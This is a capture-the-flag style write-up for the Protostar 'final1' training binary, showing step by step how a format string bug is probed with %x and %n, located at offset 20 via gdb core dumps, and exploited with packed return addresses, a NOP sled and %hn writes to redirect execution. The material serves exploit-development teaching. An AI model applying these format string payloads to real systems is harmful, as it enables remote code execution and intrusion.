#final1 solution:

i this stage, we have a format string bug, but unlike easy challenge - we cannot see any information..
so, let's show that we are not so blind.

  	p = "login "
	p += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	p += "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%n\n"
	
let's test this
ops, app crash:) (if not - just play with .%x)

root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.2119
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0xb7ed7a59 in ?? ()
(gdb) x/i $pc
0xb7ed7a59:     mov    %edx,(%eax)
(gdb) i r eax
eax            0x41414141       1094795585

cool.

now, just to play with it long enough to know the exact location of %n.
my location is 20. let's test it.

	p = "login "
	p += "BBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	p += "%20$hn\n"
	
root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.10535
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0xb7ed80ae in ?? ()
(gdb) i r eax
eax            0x41424242       1094861378

let's pad "login " with one byte to alignment.
  	p = "login A"
	p += "BBBB"
	p += "%20$hn\n"

Good!

my final exploit look like this:
  	p = "login A"
	p += pack("<I", 0xbffff70e) # write first 2 byte
	p += pack("<I", 0xbffff70c) # write last 2 byte
	p += "\x90"*70 # start of shellcode
	p += "\x33\xD2\x89\x12\x90" #some exception - xor edx,edx mov [edx], edx
	p += "\x90"*5
	p += "%49011x%20$hn"
	p += "%14129x%21$hn\n"

i test exception proof, if u want u can test shellcode proof

root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.final1.10540
Core was generated by `/opt/protostar/bin/final1'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff777 in ?? ()
(gdb) x/i $pc
0xbffff777:     mov    %edx,(%edx)
